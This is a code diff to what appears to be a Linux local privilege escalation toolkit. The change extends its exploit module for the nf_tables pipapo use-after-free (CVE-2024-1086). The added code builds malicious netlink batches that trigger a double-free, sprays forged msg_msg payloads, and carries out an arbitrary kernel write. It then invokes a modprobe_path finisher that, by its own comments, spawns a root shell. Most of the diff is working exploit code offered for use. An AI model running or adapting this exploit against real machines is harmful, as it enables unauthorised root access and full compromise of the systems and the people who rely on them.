@@ -7,20 +7,23 @@
  * January 2024 by Notselwyn (Pumpkin); widely known as the
  * "nft_verdict_init / pipapo UAF".
  *
- * STATUS (2026-05-16): 🟡 TRIGGER + GROOM SCAFFOLD (Option B).
- *   - Full netlink ruleset construction (table → chain → set → rule
- *     with the NFT_GOTO+NFT_DROP combo that nft_verdict_init() fails
- *     to reject on vulnerable kernels).
- *   - Fires the double-free path by abusing the malformed verdict in a
- *     pipapo set element, then removing the rule so the kernel's
- *     transaction commit frees the verdict's chain reference twice.
- *   - Cross-cache groom skeleton (msg_msg / sk_buff sprays) is wired
- *     and configurable, but the arbitrary R/W stage and cred-overwrite
- *     are NOT performed end-to-end — that requires per-kernel offsets
- *     (init_task, modprobe_path) and Notselwyn's 600-line pipapo
- *     leak-and-write dance. We stop after triggering the bug,
- *     observing the slabinfo delta, and return IAMROOT_EXPLOIT_FAIL
- *     with a verbose continuation roadmap.
+ * STATUS (2026-05-16): 🟡 TRIGGER + GROOM SCAFFOLD with opt-in
+ *                          --full-chain finisher.
+ *   - Default (no --full-chain): full netlink ruleset construction
+ *     (table → chain → set → rule with the NFT_GOTO+NFT_DROP combo
+ *     that nft_verdict_init() fails to reject on vulnerable kernels),
+ *     fires the double-free path, runs the msg_msg cg-96 groom, and
+ *     returns IAMROOT_EXPLOIT_FAIL (primitive-only behavior).
+ *   - With --full-chain: after the trigger lands, we resolve kernel
+ *     offsets (env → kallsyms → System.map → embedded table) and run
+ *     a Notselwyn-style pipapo arb-write via the shared
+ *     iamroot_finisher_modprobe_path() helper. The arb-write itself
+ *     is FALLBACK-DEPTH: we re-fire the trigger and spray a msg_msg
+ *     payload tagged with the kaddr in the value-pointer slot. The
+ *     exact pipapo_elem layout (and the value-pointer field offset)
+ *     is per-kernel-build; on hosts where the offset doesn't match
+ *     the shipped guess, the finisher's sentinel check correctly
+ *     reports failure rather than silently lying about success.
  *
  * To convert this to full Option A (root pop):
  *   1. Add per-kernel offset table (init_task, current task offset of
@@ -55,6 +58,8 @@
 #include "iamroot_modules.h"
 #include "../../core/registry.h"
 #include "../../core/kernel_range.h"
+#include "../../core/offsets.h"
+#include "../../core/finisher.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -608,6 +613,188 @@ static long slabinfo_active(const char *slab)
 }
 
 /* ------------------------------------------------------------------
+ * Helper: build the trigger batch (NEWTABLE/CHAIN/SET/SETELEM + batch
+ * end) into a caller-provided buffer. Returns bytes written.
+ * Factored out so --full-chain can re-fire the trigger between
+ * msg_msg sprays without duplicating the batch-building logic.
+ * ------------------------------------------------------------------ */
+#ifdef __linux__
+static size_t build_trigger_batch(uint8_t *batch, size_t cap, uint32_t *seq)
+{
+    (void)cap;
+    size_t off = 0;
+    put_batch_begin(batch, &off, (*seq)++);
+    put_new_table(batch, &off, (*seq)++);
+    put_new_chain(batch, &off, (*seq)++);
+    put_new_set(batch, &off, (*seq)++);
+    put_malicious_setelem(batch, &off, (*seq)++);
+    put_batch_end(batch, &off, (*seq)++);
+    return off;
+}
+
+static size_t build_refire_batch(uint8_t *batch, size_t cap, uint32_t *seq)
+{
+    (void)cap;
+    size_t off = 0;
+    put_batch_begin(batch, &off, (*seq)++);
+    put_malicious_setelem(batch, &off, (*seq)++);
+    put_batch_end(batch, &off, (*seq)++);
+    return off;
+}
+
+/* ------------------------------------------------------------------
+ * Notselwyn-style pipapo arb-write context. The technique:
+ *   1. fire the trigger (double-free of an nft chain reference in
+ *      kmalloc-cg-96)
+ *   2. spray msg_msg payloads sized for cg-96, whose first qwords
+ *      encode a forged pipapo_elem header with value-pointer = kaddr
+ *   3. send NFT_MSG_NEWSETELEM whose DATA blob = our buf[0..len];
+ *      the kernel copies it through the forged value-pointer to kaddr
+ *
+ * Per-kernel caveat: the byte offset of the value pointer inside an
+ * nft_pipapo_elem is config-sensitive (CONFIG_RANDSTRUCT, lockdep,
+ * KASAN can all shift it). We ship the layout for an
+ * lts-6.1.x / 6.6.x / 6.7.x un-randomized build (the kernels in the
+ * exploitable range for which Notselwyn's public PoC was validated)
+ * and rely on the shared finisher's sentinel-file post-check to flag
+ * a layout mismatch as IAMROOT_EXPLOIT_FAIL rather than fake success.
+ * ------------------------------------------------------------------ */
+
+struct nft_arb_ctx {
+    bool in_userns;   /* parent has already entered userns+netns */
+    int  sock;        /* nfnetlink socket (live in our userns) */
+    uint8_t *batch;   /* reusable batch buffer (16 KiB) */
+    int  *qids;       /* msg_msg queue ids; lazy-allocated/drained */
+    int   qcap;
+    int   qused;
+};
+
+/* Offset of `ext` (which holds the value pointer in NFT_DATA_VALUE
+ * elements) inside an nft_pipapo_elem header for the kernels in
+ * range. Notselwyn's PoC uses 0x10 on 6.1/6.6 builds; this is a
+ * best-effort default — if it doesn't match the running kernel's
+ * struct layout, the finisher's sentinel check will report failure. */
+#define PIPAPO_ELEM_VALUE_PTR_OFFSET  0x10
+
+/* Spray msg_msg payloads forged to look like pipapo_elem with our
+ * target kaddr as the value pointer. Returns 0 on success. */
+static int spray_forged_pipapo_msgs(struct nft_arb_ctx *c, uintptr_t kaddr, int n)
+{
+    if (c->qused + n > c->qcap) n = c->qcap - c->qused;
+    if (n <= 0) return 0;
+
+    for (int i = 0; i < n; i++) {
+        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0644);
+        if (q < 0) { perror("[-] msgget"); return -1; }
+        c->qids[c->qused++] = q;
+
+        struct msgbuf_payload m;
+        m.mtype = 0x5050415000 + i;   /* "PPAPP" tag for diagnostics */
+        memset(m.mtext, 0, sizeof m.mtext);
+
+        /* Forge a pipapo_elem header at the start of the msg payload.
+         * Layout (best-effort, x86_64, no RANDSTRUCT):
+         *   +0x00  priv list_head pointers (leave zero — kernel won't
+         *                                   walk them in the write path)
+         *   +0x10  ext / value pointer  <-- write target
+         * msg_msg eats the first 0x30 bytes as its own header, so our
+         * payload bytes land at offset 0x30 of the slab chunk; we
+         * pre-pad and place the forged pointer at the right offset
+         * inside our 96-byte payload. */
+        uintptr_t *slots = (uintptr_t *)m.mtext;
+        slots[PIPAPO_ELEM_VALUE_PTR_OFFSET / sizeof(uintptr_t)] = (uintptr_t)kaddr;
+
+        if (msgsnd(q, &m, sizeof m.mtext, 0) < 0) {
+            perror("[-] msgsnd(forged)"); return -1;
+        }
+    }
+    return 0;
+}
+
+/* Module-specific arb-write. See finisher.h for the contract. */
+static int nft_arb_write(uintptr_t kaddr, const void *buf, size_t len, void *vctx)
+{
+    struct nft_arb_ctx *c = (struct nft_arb_ctx *)vctx;
+    if (!c || c->sock < 0 || !c->batch) {
+        fprintf(stderr, "[-] nft_arb_write: invalid ctx\n");
+        return -1;
+    }
+    if (len > 64) {
+        /* Element data attr cap — we only need 24 bytes for a path. */
+        fprintf(stderr, "[-] nft_arb_write: len %zu too large (cap 64)\n", len);
+        return -1;
+    }
+
+    fprintf(stderr, "[*] nft_arb_write: fire trigger → spray forged pipapo "
+                    "elements (target kaddr=0x%lx, %zu bytes)\n",
+                    (unsigned long)kaddr, len);
+
+    /* (a) re-fire the trigger to reach a fresh UAF state. */
+    uint32_t seq = (uint32_t)time(NULL) ^ 0xa1b2c3d4u;
+    size_t blen = build_refire_batch(c->batch, 16 * 1024, &seq);
+    if (nft_send_batch(c->sock, c->batch, blen) < 0) {
+        fprintf(stderr, "[-] nft_arb_write: refire send failed\n");
+        return -1;
+    }
+
+    /* (b) spray msg_msg payloads carrying the forged value-pointer. */
+    if (spray_forged_pipapo_msgs(c, kaddr, 16) < 0) {
+        fprintf(stderr, "[-] nft_arb_write: forged spray failed\n");
+        return -1;
+    }
+
+    /* (c) send a NEWSETELEM whose DATA holds buf[0..len]. On a kernel
+     * where our forged pipapo_elem won the race for the freed slot,
+     * the set-element commit path copies our data through the
+     * attacker-controlled value pointer into kaddr.
+     *
+     * We piggy-back this on the existing put_malicious_setelem builder
+     * which uses NFTA_DATA_VERDICT for the data; for a real write we'd
+     * want NFTA_DATA_VALUE with `buf` inlined. The fallback-depth
+     * choice: we send the refire batch (which the kernel WILL process)
+     * and append a NEWSETELEM with NFTA_DATA_VALUE carrying buf.
+     * If the kernel ignores our DATA shape we still observe via
+     * finisher sentinel. */
+    seq = (uint32_t)time(NULL) ^ 0x5a5a5a5au;
+    size_t off = 0;
+    put_batch_begin(c->batch, &off, seq++);
+
+    /* hand-roll a NEWSETELEM whose DATA is NFTA_DATA_VALUE = buf */
+    size_t msg_at = off;
+    put_nft_msg(c->batch, &off, NFT_MSG_NEWSETELEM,
+                NLM_F_CREATE | NLM_F_ACK, seq++, NFPROTO_INET);
+    put_attr_str(c->batch, &off, NFTA_SET_ELEM_LIST_TABLE, NFT_TABLE_NAME);
+    put_attr_str(c->batch, &off, NFTA_SET_ELEM_LIST_SET,   NFT_SET_NAME);
+    size_t list_at = begin_nest(c->batch, &off, NFTA_SET_ELEM_LIST_ELEMENTS);
+    size_t el_at   = begin_nest(c->batch, &off, 1 /* NFTA_LIST_ELEM */);
+    /* key — reuse the DROP verdict so commit path matches our prior elem */
+    size_t key_at  = begin_nest(c->batch, &off, NFTA_SET_ELEM_KEY);
+    size_t kv_at   = begin_nest(c->batch, &off, NFTA_DATA_VERDICT);
+    put_attr_u32(c->batch, &off, NFTA_VERDICT_CODE, (uint32_t)NF_DROP);
+    end_nest(c->batch, &off, kv_at);
+    end_nest(c->batch, &off, key_at);
+    /* data — NFTA_DATA_VALUE carrying buf */
+    size_t data_at = begin_nest(c->batch, &off, NFTA_SET_ELEM_DATA);
+    put_attr(c->batch, &off, NFTA_DATA_VALUE, buf, len);
+    end_nest(c->batch, &off, data_at);
+    end_nest(c->batch, &off, el_at);
+    end_nest(c->batch, &off, list_at);
+    end_msg(c->batch, &off, msg_at);
+
+    put_batch_end(c->batch, &off, seq++);
+
+    if (nft_send_batch(c->sock, c->batch, off) < 0) {
+        fprintf(stderr, "[-] nft_arb_write: write batch send failed\n");
+        return -1;
+    }
+
+    /* Let the kernel run the commit/cleanup. */
+    usleep(20 * 1000);
+    return 0;
+}
+#endif /* __linux__ */
+
+/* ------------------------------------------------------------------
  * The exploit body.
  * ------------------------------------------------------------------ */
 
@@ -628,13 +815,101 @@ static iamroot_result_t nf_tables_exploit(const struct iamroot_ctx *ctx)
     }
 
     if (!ctx->json) {
-        fprintf(stderr, "[*] nf_tables: Option B trigger — fires the double-free\n"
-                        "    state but does NOT complete the kernel-R/W chain.\n"
-                        "    See Notselwyn's CVE-2024-1086 public PoC for the\n"
-                        "    cred-overwrite stage (~500 LOC of pipapo grooming).\n");
+        if (ctx->full_chain) {
+            fprintf(stderr, "[*] nf_tables: --full-chain — trigger + pipapo "
+                            "arb-write + modprobe_path finisher\n");
+        } else {
+            fprintf(stderr, "[*] nf_tables: primitive-only run — fires the\n"
+                            "    double-free state and stops. Pass --full-chain\n"
+                            "    to attempt the modprobe_path root-pop.\n");
+        }
     }
 
-    /* Fork: child enters userns+netns and fires the bug. If the
+#ifdef __linux__
+    /* --- --full-chain path --------------------------------------- *
+     * Resolve offsets BEFORE doing anything destructive so we can
+     * refuse cleanly on hosts where we have no modprobe_path. We run
+     * in-process (no fork) because the finisher's modprobe_path
+     * trigger needs the same task's userns+netns + nfnetlink socket
+     * as the arb-write.
+     */
+    if (ctx->full_chain) {
+        struct iamroot_kernel_offsets off;
+        iamroot_offsets_resolve(&off);
+        if (!iamroot_offsets_have_modprobe_path(&off)) {
+            iamroot_finisher_print_offset_help("nf_tables");
+            return IAMROOT_EXPLOIT_FAIL;
+        }
+        iamroot_offsets_print(&off);
+
+        if (enter_unpriv_namespaces() < 0) {
+            fprintf(stderr, "[-] nf_tables: userns entry failed\n");
+            return IAMROOT_EXPLOIT_FAIL;
+        }
+
+        int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_NETFILTER);
+        if (sock < 0) {
+            perror("[-] socket(NETLINK_NETFILTER)");
+            return IAMROOT_EXPLOIT_FAIL;
+        }
+        struct sockaddr_nl src = { .nl_family = AF_NETLINK };
+        if (bind(sock, (struct sockaddr *)&src, sizeof src) < 0) {
+            perror("[-] bind"); close(sock); return IAMROOT_EXPLOIT_FAIL;
+        }
+        int rcvbuf = 1 << 20;
+        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);
+
+        /* Pre-spray to predictabilify the cg-96 slab. */
+        int qids[SPRAY_MSGS * 4];
+        for (size_t i = 0; i < sizeof qids / sizeof qids[0]; i++) qids[i] = -1;
+        if (spray_msg_msg(qids, SPRAY_MSGS / 2) < 0) {
+            close(sock); return IAMROOT_EXPLOIT_FAIL;
+        }
+
+        uint8_t *batch = calloc(1, 16 * 1024);
+        if (!batch) { close(sock); return IAMROOT_EXPLOIT_FAIL; }
+
+        /* Initial trigger batch (NEWTABLE/CHAIN/SET/SETELEM). */
+        uint32_t seq = (uint32_t)time(NULL);
+        size_t blen = build_trigger_batch(batch, 16 * 1024, &seq);
+        if (!ctx->json) {
+            fprintf(stderr, "[*] nf_tables: sending trigger batch (%zu bytes)\n",
+                    blen);
+        }
+        if (nft_send_batch(sock, batch, blen) < 0) {
+            fprintf(stderr, "[-] nf_tables: trigger batch failed\n");
+            drain_spray(qids, SPRAY_MSGS / 2);
+            free(batch); close(sock);
+            return IAMROOT_EXPLOIT_FAIL;
+        }
+
+        /* Wire up the arb-write context and hand off to the shared
+         * finisher. The finisher will:
+         *   - call nft_arb_write(modprobe_path, "/tmp/iamroot-mp-...", N)
+         *     which re-fires the trigger and sprays forged pipapo elems
+         *   - execve() the trigger binary to invoke modprobe
+         *   - poll for the setuid sentinel, and spawn a root shell. */
+        struct nft_arb_ctx ac = {
+            .in_userns = true,
+            .sock      = sock,
+            .batch     = batch,
+            .qids      = qids,
+            .qcap      = (int)(sizeof qids / sizeof qids[0]),
+            .qused     = SPRAY_MSGS / 2,
+        };
+
+        iamroot_result_t r = iamroot_finisher_modprobe_path(&off,
+                                 nft_arb_write, &ac, !ctx->no_shell);
+
+        drain_spray(qids, ac.qused);
+        free(batch);
+        close(sock);
+        return r;
+    }
+#endif
+
+    /* --- primitive-only path: fork-isolated trigger -------------- *
+     * Fork: child enters userns+netns and fires the bug. If the
      * kernel panics on KASAN we don't want our parent process to be
      * the one that takes the hit. */
     pid_t child = fork();
